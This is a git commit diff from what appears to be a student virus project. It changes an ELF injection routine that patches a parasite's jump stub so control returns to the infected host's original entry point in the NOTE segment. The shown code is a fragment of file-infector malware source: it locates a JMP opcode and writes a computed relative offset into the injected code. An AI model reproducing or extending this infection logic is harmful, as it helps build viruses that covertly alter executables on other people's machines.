c4c822c7bea6f42bb3ede6a5ddb50441c1ac2b8b
jle-quel <jle-quel@student.42.us.org>
2019-04-01 06:44:04 -0400

    [UPDATE]: patch entry point stub and parasite

--- src_war/injection.c
+++ src_war/injection.c
@@ -49,23 +49,25 @@ __attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf
 
 __attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
 {
-	char *tmp = dst + host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
+	size_t offset = JUMP_SIZE;
+
+	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
 
 	while (true)
 	{
-		if (*(unsigned char *)tmp == 0xe9)
+		if (*(unsigned char *)dst == 0xe9)
 		{
-			tmp++;
+			dst++;
+			offset++;
 			break;
 		}
-		tmp++;
+		offset++;
+		dst++;
 	}
 
+	const int entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));
 
-	const size_t offset = (void *)(dst + (host->segment[NOTE]->p_vaddr + host->segment[NOTE]->p_memsz)) - (void *)tmp;
-//	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + host->segment[NOTE]->p_memsz);
-
-//	_memcpy(dst + host->segment[NOTE]->p_offset + (host->segment[NOTE]->p_filesz - offset), &entry_point, sizeof(int));
+	_memcpy(dst, &entry_point, sizeof(int));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
